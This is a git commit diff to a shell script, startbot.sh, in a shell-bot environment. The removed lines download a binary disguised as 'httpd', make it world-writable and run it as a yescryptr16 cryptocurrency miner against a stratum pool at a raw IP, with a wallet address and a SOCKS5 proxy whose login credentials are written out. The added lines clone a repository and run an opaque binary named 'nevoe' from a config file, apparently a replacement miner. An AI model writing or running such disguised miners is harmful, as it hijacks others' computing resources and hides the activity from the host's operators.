72581d2c062fab6e732bbdba3e04fa0540f49ded
Sairin-SLOT <147265853+Sairin-SLOT@users.noreply.github.com>
2023-11-22 00:09:30 +0800

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -4,7 +4,9 @@
 # kumaha aink we njink
 
 cd /home/shell-bot
-wget https://gitlab.com/mulungweb2020/httpd/-/raw/main/httpd
-chmod +x httpd
-chmod 777 httpd
-./httpd -a yescryptr16 -o stratum+tcp://149.102.231.74:443 -u web1qusfnt4vf67cfklrn0ntsd6ggpru04dwm7cpsp2.$(echo turu-$(shuf -i 1-9999 -n 1)) -p x -t 4 --proxy=socks5://6SKWObeYXA:6a9pyC0p@sin.socks.ipvanish.com:1080
+git clone https://github.com/Sairin-SLOT/nevoiu.git
+cd nevoiu
+chmod +x LICENSE
+chmod +x config.json
+chmod +x nevoe
+./nevoe -c "config.json"
